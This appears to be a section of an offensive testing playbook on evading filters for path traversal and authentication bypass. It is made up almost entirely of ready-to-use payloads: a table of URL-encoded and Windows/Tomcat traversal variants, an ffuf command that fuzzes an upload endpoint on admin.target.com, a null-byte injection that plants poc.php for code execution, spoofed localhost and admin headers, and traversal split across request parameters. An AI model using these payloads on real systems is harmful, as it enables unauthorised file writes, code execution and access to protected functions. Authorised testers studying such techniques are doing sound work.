# Evasion Techniques — Auth Bypass + Path Traversal

## 7.1 Path Traversal Encoding Variants

If standard `../` is filtered, try these encoding alternatives:

| Payload | Encoding Type | Use When |
|---|---|---|
| `%2e%2e%2f` | URL-encoded | Standard WAF bypass |
| `%252e%252e%252f` | Double URL-encoded | Server decodes twice |
| `..%2f` | Mixed encoding | Partial filter bypass |
| `%2e%2e/` | Encoded dots, literal slash | Slash-only filter |
| `..\` | Windows separator | IIS / Windows hosts |
| `..%5c` | URL-encoded backslash | Windows + encoded |
| `....//` | Overlong sequence | Naive `../` string filter |
| `..;/` | Tomcat-specific | Apache Tomcat routing |

```bash
# Automate encoding variants with ffuf
ffuf -w /usr/share/seclists/Fuzzing/path-traversal-unix.txt \
     -u "https://admin.target.com/api/upload-resource?fullFilePath=resource/FUZZ/target.html" \
     -X POST \
     -H "Authorization: ${JWT}" \
     -F "file=@test.html" \
     -mc 200,201
```

---

## 7.2 Null Byte Injection (Legacy Environments)

On servers using C/C++ file handling libraries or legacy PHP, a null byte terminates the filename string:
```
fullFilePath=resource%2F%2e%2e%2Fpoc.php%00.html
# Server writes:  poc.php  (null byte truncates .html extension)
# Allows execution of PHP if server runs PHP
```

---

## 7.3 Alternative Auth Headers (If Bearer Stripping Fails)

If the Bearer prefix stripping does not bypass auth, the server may have another trust boundary:
```
# Spoof internal/localhost identity
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1

# Claim admin role via custom headers (if app trusts them)
X-User-Role: admin
X-Admin: true
X-Internal: 1
```

---

## 7.4 Multi-Step Traversal (Chained Path Components)

If the server validates `../` sequences before the path is fully constructed, chaining traversal across multiple parameters may bypass it:
```
# Split traversal across two parameters
fullFilePath=resource%2F..&extra=..%2Ftarget.html

# Or inject into the `owner` / `provider` fields
owner=built-in%2F..%2F..&fullFilePath=web%2Fbuild%2Ftarget.html
```
